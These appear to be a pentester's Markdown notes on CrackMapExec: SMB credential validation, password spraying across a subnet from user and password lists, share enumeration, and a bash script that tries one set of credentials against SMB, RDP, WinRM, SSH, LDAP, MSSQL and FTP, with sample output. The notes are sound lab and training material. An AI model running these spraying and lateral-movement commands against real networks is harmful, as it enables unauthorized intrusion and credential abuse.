
# CrackMapExec (CME)


```text
                                                    .
                                                _._/|_
                      .                        (__( (_(
                     /|                   - '. \'-:)8)-.
                    ( (_..-..          .'     '.'-(_(-' 
           _~_       '-.--.. '.      .'         '  )8)  
        __(__(__     \      88 \    /            )(8(        \.    .
       (_((_((_(      8\     88 \.-'  .-.        )88 :       /\\  _X_ __ .
     \=-:--:--:--.     8)     88/__) /(e))       88.'        \#\\(__((_//\   .
    _,\_o__o__o__/,__(8(_,__,_'.'--' '--' _    _88.'..___,___,\_,,,|/_(Y(/__,__,___,___ldb
                \    '._''--..'-/88 ) 88)(8  \\  \              \w\_   /X/
                 8\ __.--''_--'( 8  ( 8/   88( )8 )              -' ' __ 
                  '8888--''     \ 8  \88   88| 88(                   /_/
                                )88  (88   ) ) 88\                  _ '
                               ( 8    )88 ( (   88\                /V
                                )8)   (8\'-8 )-. '8'.___ __
                                //     \8 '-//--'  '88-8.-'             H
                               ((     ((   ))     
                                \      \   (    X    
                                                                       Y
                                         X   __
                                            )_/  /\
                                             '  /W/
                                                \|
```

[CrackMapExec GitHub repo](https://github.com/byt3bl33d3r/crackmapexec) is no longer maintained. Its maintained successor is [NetExec](./netexec.md).

CME is still usable in labs and pentests, and it remains available in Kali's repositories.
If needed, install it with:
```bash
sudo apt install crackmapexec
```

CME = post-exploitation and network enumeration tool for Windows & Active Directory 
features
- password spraying
- enumerate shares, users, sessions and assess what credentials can do for lateral movement

### get crackmapexec -ing

```bash
└─$ crackmapexec -h                                                             
usage: crackmapexec [-h] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL] [--darrell] [--verbose]
                    {winrm,ftp,smb,mssql,ssh,rdp,ldap} ...

      ______ .______           ___        ______  __  ___ .___  ___.      ___      .______    _______ ___   ___  _______   ______
     /      ||   _  \         /   \      /      ||  |/  / |   \/   |     /   \     |   _  \  |   ____|\  \ /  / |   ____| /      |
    |  ,----'|  |_)  |       /  ^  \    |  ,----'|  '  /  |  \  /  |    /  ^  \    |  |_)  | |  |__    \  V  /  |  |__   |  ,----'
    |  |     |      /       /  /_\  \   |  |     |    <   |  |\/|  |   /  /_\  \   |   ___/  |   __|    >   <   |   __|  |  |
    |  `----.|  |\  \----. /  _____  \  |  `----.|  .  \  |  |  |  |  /  _____  \  |  |      |  |____  /  .  \  |  |____ |  `----.
     \______|| _| `._____|/__/     \__\  \______||__|\__\ |__|  |__| /__/     \__\ | _|      |_______|/__/ \__\ |_______| \______|

                                                A swiss army knife for pentesting networks
                                    Forged by @byt3bl33d3r and @mpgn_x64 using the powah of dank memes

                                           Exclusive release for Porchetta Industries users
                                                       https://porchetta.industries/

                                                   Version : 5.4.0
                                                   Codename: Indestructible G0thm0g

options:
  -h, --help            show this help message and exit
  -t THREADS            set how many concurrent threads to use (default: 100)
  --timeout TIMEOUT     max timeout in seconds of each thread (default: None)
  --jitter INTERVAL     sets a random delay between each connection (default: None)
  --darrell             give Darrell a hand
  --verbose             enable verbose output

protocols:
  available protocols

  {winrm,ftp,smb,mssql,ssh,rdp,ldap}
    winrm               own stuff using WINRM
    ftp                 own stuff using FTP
    smb                 own stuff using SMB
    mssql               own stuff using MSSQL
    ssh                 own stuff using SSH
    rdp                 own stuff using RDP
    ldap                own stuff using LDAP

```


### Example Network  

| Machine         | IP               |
| --------------- | ---------------- |
| Kali (attacker) | 192.168.xx.xxx   |
| Alice (target)  | 192.168.111.137  |
| Network         | 192.168.111.0/24 |

###  SMB Credential Validation

#### 2 Authentication Contexts

1. `--local-auth`: validate credentials against the target machine’s local SAM database

```bash
crackmapexec smb 192.168.111.137 -u <USERNAME> -p '<PASSWORD>' --local-auth

# typical output
SMB  192.168.111.137  445  <HOSTNAME>  [*] Windows 10 / Server 2019 Build 19041 x64 (name:<HOSTNAME>) (domain:<DOMAIN>) (signing:False) (SMBv1:False)
SMB  192.168.111.137  445  <HOSTNAME>  [+] <HOSTNAME>\<USERNAME>:<PASSWORD>

# if local admin
SMB  192.168.111.137  445  <HOSTNAME>  [+] <HOSTNAME>\<USERNAME>:<PASSWORD> (Pwn3d!)
```

2. `-d <DOMAIN>` : validate credentials as of user as a domain account in that domain
	- if user belongs to AD, use domain 

```bash
crackmapexec smb 192.168.111.137 -u <USERNAME> -p '<PASSWORD>' -d <DOMAIN>

# typical output
SMB  192.168.111.137  445  <HOSTNAME>  [*] Windows 10 / Server 2019 Build 19041 x64 (name:<HOSTNAME>) (domain:<DOMAIN>) (signing:False) (SMBv1:False)
SMB  192.168.111.137  445  <HOSTNAME>  [+] <DOMAIN>\<USERNAME>:<PASSWORD>

# if local admin
SMB  192.168.111.137  445  <HOSTNAME>  [+] <DOMAIN>\<USERNAME>:<PASSWORD> (Pwn3d!)
```

**Multiple user credentials (username & password) enumeration on multiple hosts**
- Try all combinations of credentials 
```bash
└─$ crackmapexec smb 192.168.111.0/24 -u usernames.txt -p passwords.txt --continue-on-success

[*] First time use detected
[*] Creating home directory structure
[*] Creating default workspace
[*] Initializing WINRM protocol database
[*] Initializing FTP protocol database
[*] Initializing SMB protocol database
[*] Initializing MSSQL protocol database
[*] Initializing SSH protocol database
[*] Initializing RDP protocol database
[*] Initializing LDAP protocol database
[*] Copying default configuration file
[*] Generating SSL certificate

SMB         192.168.111.137  445    HOSTNAME         [*] Windows 11 Build 22000 x64 (name:HOSTNAME) (domain:domain.com) (signing:False) (SMBv1:False)
SMB         192.168.111.137  445    HOSTNAME         [-] domain.com\alice:alice_password STATUS_LOGON_FAILURE 
SMB         192.168.111.137  445    HOSTNAME         [+] domain.com\bob:alice_password 
SMB         192.168.111.137  445    HOSTNAME         [+] domain.com\eve:alice_password
...
```
- `STATUS_LOGON_FAILURE`:  CME may return this whether the username is invalid or the password is wrong, so avoid over-interpreting that result.
- `--continue-on-success` : avoid stopping after 1st valid credentials
- `[+]` or  `[-]` :  indicate if credentials valid or not
- `Pwn3d!` = local administrative privileges on that target

**Multiple user credentials (usernames  & single password) enumeration on multiple hosts**
```
└─$ crackmapexec smb 192.168.111.137-140 -u users.txt -p 'random_password!' -d domain.com --continue-on-success
```

###  SMB Shares Enumeration 

```bash
└─$ crackmapexec smb 192.168.111.137 -u alice -p "alice_password" --shares 

SMB         192.168.111.137 445    HOSTNAME         [*] Windows 10 / Server 2019 Build 19041 x64 (name:HOSTNAME) (domain:<DOMAIN>.com) (signing:False) (SMBv1:False)
SMB         192.168.111.137    HOSTNAME         [+] zeus.corp\alice:alice_password (Pwn3d!)
SMB         192.168.111.137 445    HOSTNAME         [+] Enumerated shares
SMB         192.168.111.137 445    HOSTNAME         Share           Permissions     Remark
SMB         192.168.111.137 445    HOSTNAME         -----           -----------     ------
SMB         192.168.111.137 445    HOSTNAME         ADMIN$          READ,WRITE      Remote Admin
SMB         192.168.111.137 445    HOSTNAME         C$              READ,WRITE      Default share
SMB         192.168.111.137 445    HOSTNAME         IPC$            READ            Remote IPC
SMB         192.168.111.137 445    HOSTNAME         SQL             READ,WRITE     
```
-> output suggests the account has administrative privileges on the target host. Validate follow-on access manually! 
- The credentials are valid
- The account has SMB access to the host
- `Pwn3d!` = local administrative privileges on that target
- Accessible shares may provide data access, code execution paths, or lateral movement opportunities

### smb, rdp, winrm, ssh, ldap, mssql, ftp

CME offers enumeration of credential privileges for different protocols. 
	- if `nmap` or a network scan reveals the services are there -> loop through them to make it easier. 
note: In professional pentest environments, indiscriminate spraying and broad authentication checks can be noisy and may trigger detection! Scope, authorization, and rate control matter.

A) cme_loop.sh for all protocols
```bash
#!/bin/bash

# Usage: ./cme_loop.sh <target_file_or_ip> <username> <password> [domain]

TARGET=$1
USERNAME=$2
PASSWORD=$3
DOMAIN=$4  # optional

if [ -z "$TARGET" ] || [ -z "$USERNAME" ] || [ -z "$PASSWORD" ]; then
    echo "Usage: $0 <target_file_or_ip> <username> <password> [domain]"
    exit 1
fi

SERVICES=("smb" "rdp" "winrm" "ssh" "ldap" "mssql" "ftp")

for SERVICE in "${SERVICES[@]}"
do
    echo -e "\n[*] Running CME against $SERVICE on $TARGET"

    # Build base command
    CMD="crackmapexec $SERVICE $TARGET -u $USERNAME -p $PASSWORD"
    
    # Add domain if ldap and domain is supplied
    if [[ "$SERVICE" == "ldap" && -n "$DOMAIN" ]]; then
        CMD+=" -d $DOMAIN"
    fi

    # Run command with timeout and error suppression
    (timeout 30s bash -c "$CMD") || echo "[!] $SERVICE check failed or timed out, continuing..."
done
```

you will most likely get a very long output of failures and successes! 
```bash
└─$ ./cme_loop.sh 192.168.111.137 alice alice_password domain.com
...
SMB         192.168.111.137 445    DC_HOSTNAME             [+] domain.com\alice:alice_password 
...
```

B) [`cme_bloop.sh`](./scripts/cme_bloop.sh)  for selected protocols only with optional local auth or domain auth

e.g with smb, winrm, rdp 
```bash
./cme_bloop.sh 192.168.111.137 <USERNAME> '<PASSWORD>' smb,winrm,rdp <DOMAIN>

[*] Running CME against smb on 192.168.111.137
SMB         192.168.111.137 445    <HOSTNAME>    [*] Windows 10 / Server 2019 Build 19041 x64 (name:<HOSTNAME>) (domain:<DOMAIN>) (signing:False) (SMBv1:False)
SMB         192.168.111.137 445    <HOSTNAME>    [+] <DOMAIN>\<USERNAME>:<PASSWORD>

[*] Running CME against winrm on 192.168.111.137
WINRM       192.168.111.137 5985   <HOSTNAME>    [+] <DOMAIN>\<USERNAME>:<PASSWORD>
```

domain auth
```bash
./cme_bloop.sh 192.168.111.137 <USERNAME> '<PASSWORD>' smb,winrm,mssql,rdp domain <DOMAIN>

[*] Running CME against smb on 192.168.111.137
SMB         192.168.111.137 445    <HOSTNAME>    [*] Windows 10 / Server 2019 Build 19041 x64 (name:<HOSTNAME>) (domain:<DOMAIN>) (signing:False) (SMBv1:False)
SMB         192.168.111.137 445    <HOSTNAME>    [+] <DOMAIN>\<USERNAME>:<PASSWORD> (Pwn3d!)

[*] Running CME against winrm on 192.168.111.137
WINRM       192.168.111.137 5985   <HOSTNAME>    [+] <DOMAIN>\<USERNAME>:<PASSWORD>

[*] Running CME against mssql on 192.168.111.137  
[!] mssql check failed or timed out, continuing...

[*] Running CME against rdp on 192.168.111.137
RDP         192.168.111.137 3389   <HOSTNAME>    [-] <DOMAIN>\<USERNAME>:<PASSWORD> STATUS_LOGON_FAILURE
```

local auth
```bash
./cme_bloop.sh 192.168.111.137 <USERNAME> '<PASSWORD>' smb,winrm local

[*] Running CME against smb on 192.168.111.137
SMB         192.168.111.137 445    <HOSTNAME>    [*] Windows 10 / Server 2019 Build 19041 x64 (name:<HOSTNAME>) (domain:<DOMAIN>) (signing:False) (SMBv1:False)
SMB         192.168.111.137 445    <HOSTNAME>    [+] <HOSTNAME>\<USERNAME>:<PASSWORD>

[*] Running CME against winrm on 192.168.111.137
WINRM       192.168.111.137 5985   <HOSTNAME>    [-] <HOSTNAME>\<USERNAME>:<PASSWORD> STATUS_LOGON_FAILURE
```


---

<sub>source of <a href="https://asciiartist.com/ldb/fantasyascii.txt"> kraken ascii art </a></sub>



